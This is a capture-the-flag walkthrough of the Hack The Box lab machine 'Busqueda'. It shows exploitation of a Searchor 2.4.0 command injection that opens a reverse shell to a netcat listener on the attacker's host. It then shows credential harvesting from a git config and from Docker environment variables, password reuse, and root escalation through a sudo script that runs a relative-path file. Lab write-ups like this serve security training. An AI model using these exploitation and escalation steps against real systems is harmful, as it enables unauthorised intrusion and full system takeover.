# Busqueda

<figure><img src="Images/Busqueda/Busqueda.png" alt=""><figcaption></figcaption></figure>

## User Flag

### Enumeration

First we start off with a simple nmap scan:

```console
toasty@parrot$ sudo nmap -sC -p- 10.10.11.208
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-21 21:32 BST
Nmap scan report for 10.10.11.208
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://searcher.htb/

```

We see that port 80 will redirect us to `http://searcher.htb` so we need to add that to our host's file:

```console
toasty@parrot$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost

toasty@parrot$ echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts
10.10.11.208 searcher.htb
toasty@parrot$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost
10.10.11.208 searcher.htb

```

### Webpage

We can now visit `http://searcher.htb` and we get the following page:

<figure><img src="Images/Busqueda/searcher_homepage.png" alt=""><figcaption></figcaption></figure>

It is a site that says it can allow you to monitor social mentions across the web. At the bottom of the page you have a box to select a search engine and then a query. You choose a search engine and enter a query and hit enter and it will give you the URL you would need to accomplish that query using that search engine. We also see at the bottom that the site is powered by Flask and Searchor 2.4.0.

#### DuckDuckGo and Bread example

Here is an example using DuckDuckGo and "bread" as the query:

<div align="left">

<figure><img src="Images/Busqueda/duck_bread_url.png" alt=""><figcaption></figcaption></figure>

</div>

<figure><img src="Images/Busqueda/duck_bread.png" alt=""><figcaption></figcaption></figure>

### Command Injection

We saw at the bottom of our page that it was using Searchor 2.4.0 which is vulnerable to this exploit by [nikn0laty](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection).

Basically because of how the program calls a function called `eval` you are able to comment outside the query and then inject your own commands.

The POC uses a script but for simplicity I demonstrate doing it from the site in the pictures below. The query will show us the user being used on the server:\


<figure><img src="Images/Busqueda/cmd_inject_POC_step1.png" alt=""><figcaption></figcaption></figure>

<figure><img src="Images/Busqueda/cmd_inject_POC_step2.png" alt=""><figcaption></figcaption></figure>

### Exploit Searchor

We will need two terminals to make this work using nikn0laty's [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh). One will be a `netcat` listener listening on 9001 (can be any port you will just need to change that in the exploit.sh script) and then the second terminal to run the exploit. After it is ran we should have a shell on the server via our listener.

#### Terminal 1 - Run Exploit

```console
toasty@parrot$ ./exploit.sh http://searcher.htb 10.10.14.231
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is http://searcher.htb
[*] Input attacker is 10.10.14.231:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```

#### Terminal 2 - Listener

```console
toasty@parrot$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.231] from (UNKNOWN) [10.10.11.208] 50554
bash: cannot set terminal process group (1667): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ id
id
uid=1000(svc) gid=1000(svc) groups=1000(svc)

```

### User.txt

Now that we are in the system we can move around and we find our user flag in our home directory (svc account):

```console
bash-5.1$ ls /home/svc
ls /home/svc
user.txt
bash-5.1$ cat /home/svc/user.txt
cat /home/svc/user.txt
54e94***************************
```

## Root Flag

Now that we have our user flag we can look for how to escalate our privs to root.

### Full TTY

Now that we have a basic shell we need to upgrade to a full terminal session. You can find good info on [HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys).

I used:

```
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

### Host Enumeration

There is a lot of ways you can do host enumeration. HackTricks has a whole checklist you can go through, there are automated scripts such as linPEAs, and you can also poke around. Everyone has their own methodologies.

One of the first things I like to check is to see if we have any `sudo` powers and unfortunately we are asked for a password which we don't have.

```console
svc@busqueda:/var/www/app$ sudo -l
[sudo] password for svc: 
```

### Config File

We notice that we are in the `/var/www/app` directory and running a `ls -a` showed us a `.git` folder. The .git folder is used for version controls of code repositories. Further browsing of the `.git` folder revealed a config file!

```console
svc@busqueda:/var/www/app$ ls -a
.  ..  app.py  .git  templates
svc@busqueda:/var/www/app$ ls .git/
branches  COMMIT_EDITMSG  config  description  HEAD  hooks  index  info  logs  objects  refs
svc@busqueda:/var/www/app$ cat .git/config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

### Cody and Gitea

We get credentials for a user `cody` and to a new site: `gitea.searcher.htb`. Let's add that to our hosts file and try to visit the url:\
\
\


<figure><img src="Images/Busqueda/gitea_homepage.png" alt=""><figcaption></figcaption></figure>

It is a self-hosted Git service, let's try logging in with our credentials we just found:\
\
\


<figure><img src="Images/Busqueda/gitea_homepage_cody.png" alt=""><figcaption></figcaption></figure>

We also can see that it is running Gitea version 1.18.0

### Going in Circles

I did spend some time on the site searching around and searching for Gitea exploits. We found code for the searcher site and a second user `administartor`. There were some exploits for previous versions of Gitea but they were all RCE exploits, and we already have access on the system anyways.\
I checked the system to see if there was a possible `cody` user that we could ssh in as, but there was not. It was probably an embarrasing amount of time I spent going through this before I thought of shared/reused passwords.

### Cody = Svc

I tried to use the above password for our `svc` account to ssh in and it worked:

```console
ssh svc@searcher.htb
svc@searcher.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)
...SNIP
svc@busqueda:~$ 
```

### Sudo Check

Now that we have a password we can see if `svc` has any sudo powers:

```console
svc@busqueda:~$ sudo -l
[sudo] password for svc:  
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

```

We can run the `/opt/scripts/system-checkup.py` with sudo perms, so lets check it out.

### Python Scripts

```console
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

```

The `docker-ps` and `docker-inspect` actions run without problems, but trying to run full-checkup causes an error:

```console
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   7 months ago   Up 9 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   7 months ago   Up 9 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

Let's see if we have any permission in the `/opt/scripts/` directory:

```console
svc@busqueda:~$ ls -al /opt/scripts/
total 28
drwxr-xr-x 3 root root 4096 Dec 24  2022 .
drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..
drwxr-x--- 8 root root 4096 Apr  3 15:04 .git
-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py
-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.sh
-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py
```

We do not have read permissions so trying to open or edit the files directly will get us nowhere.

### Docker Inspect

Of the three commands, `docker-ps` gives us containers and `full-checkup` errors out. Let's work with `docker-inspect`. This is going through a python script but it is still probably interacting with the docker command line and we can find useful information on their site here: [Docker Inspect](https://docs.docker.com/engine/reference/commandline/inspect/)\


Setting the format as `{{json .}}` will give us everything and if we parse through we can see some intersting stuff in the `Config` section. It is condensed down but the commands I ran to get relevant details from both docker instances are below. Also the target machine had `jq` installed so we could prettify the json:

```console
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}'  960873171e2e | jq .
{
  "Hostname": "960873171e2e",
 ...SNIP
  "Env": [
    "USER_UID=115",
    "USER_GID=121",
    "GITEA__database__DB_TYPE=mysql",
    "GITEA__database__HOST=db:3306",
    "GITEA__database__NAME=gitea",
    "GITEA__database__USER=gitea",
    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "USER=git",
    "GITEA_CUSTOM=/data/gitea"
  ],
  "Image": "gitea/gitea:latest",
}

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}'  f84a6b33fb5a | jq .
{
  "Hostname": "f84a6b33fb5a"
  ...SNIP
  "Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.14",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.31-1.el8",
    "MYSQL_SHELL_VERSION=8.0.31-1.el8"
  ],
  "Image": "mysql:8",
}
```

Now we got two new passwords. `jI86kGUuj87guWr3RyF` and `yuiu1hoiu4i5ho1uh`.

### Back to Gitea

So immediately, I thought mysql may have the answers but checking the server it appears that mysql isn't even running! So back to Gitea. We know there is an `administrator` account and we now have two new passwords... and we are in!\
\
\


<figure><img src="Images/Busqueda/gitea_homepage_admin.png" alt=""><figcaption></figcaption></figure>

Browsing around we find those scripts that we could not view on the server earlier:\
\
\


<figure><img src="Images/Busqueda/gitea_admin_scripts.png" alt=""><figcaption></figcaption></figure>

### Full Checkup

Let's check out the `system-checkup.py` as it is the main script we call. The interesting part is the process\_action function:

```python
def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            
```

When we call the `full-checkup` action it tries to run a script called ./full-checkup.sh in our current working directory. If we just create a script and name it `full-checkup.sh` and run our command from that directory it should pull. Let's test that.

#### Full-checkup.sh

```bash
#!/bin/bash
id
```

#### Executing

```console
svc@busqueda:/tmp/tmp.t$ vi full-checkup.sh 
svc@busqueda:/tmp/tmp.t$ chmod +x full-checkup.sh 
svc@busqueda:/tmp/tmp.t$ sudo python3 /opt/scripts/system-checkup.py full-checkup
uid=0(root) gid=0(root) groups=0(root)

[+] Done!
```

### Root.txt

We can now set up a reverse shell using the `full-checkup.sh` script, but if we just want the flag we know it is generally at `/root/root.txt` so let's just grab that.

#### Full-checkup.sh

```bash
#!/bin/bash
cat /root/root.txt
```

#### Flag

```console
svc@busqueda:/tmp/tmp.t$ sudo python3 /opt/scripts/system-checkup.py full-checkup
f12a3***************************

[+] Done!

```
